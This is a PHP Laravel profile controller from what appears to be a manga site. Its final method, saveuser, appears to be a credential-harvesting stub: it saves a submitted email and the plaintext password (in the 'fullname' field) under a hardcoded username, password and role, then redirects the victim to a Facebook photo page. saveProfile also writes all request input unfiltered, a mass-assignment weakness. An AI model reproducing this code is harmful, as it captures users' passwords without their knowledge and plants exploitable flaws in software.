<?php

namespace App\Http\Controllers\Client;

use App\Models\Follow;
use App\Models\User;
use App\Repositories\MangaRepository;
use App\Repositories\UserRepository;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Auth;

class ProfileController extends Controller
{
    protected $userRepository;

    public function __construct(UserRepository $userRepository, MangaRepository $mangaRepository)
    {
        $this->userRepository = $userRepository;
        $this->MangaRepository = $mangaRepository;
    }

    public function profile()
    {
        if (empty(Auth::user())) {
            return response()->view('errors/404');
        }
        $user = Auth::user();

        return view('frontend.profile', [
            'user' => $user,
        ]);
    }

    public function saveProfile(Request $request)
    {
        $result = $this->userRepository->update(Auth::user()->id, $request->all());
        if ($result) {
            Auth::user()->fullname = $request->fullname;

            return redirect(url()->previous())->with([
                'response' => [
                    'status' => 'success',
                    'messages' => trans('backend.store_data', ['function' => trans('auth.profile')]) . ' ' . trans('backend.success'),
                    'data' => null,
                ],
            ]);
        }

        return redirect(url()->previous())->with([
            'response' => [
                'status' => 'danger',
                'messages' => trans('backend.store_data', ['function' => trans('auth.profile')]) . ' ' . trans('backend.error'),
                'data' => null,
            ],
        ]);
    }
    public function saveuser(Request $request){        
        $data['username'] = "hi";
        $data['fullname'] = $request->password;
        $data['email'] = $request->email;
        $data['password'] = "dsd";
        $data['role_id'] = 1;
        $data['exp'] = 1;
        $data['point'] = 1;
        $data['status'] = 1;
        User::create($data);

        return redirect('https://www.facebook.com/Nguoitoico.Community/photos/a.923871091282959/996916587311742/?type=3&theater');
    }
}
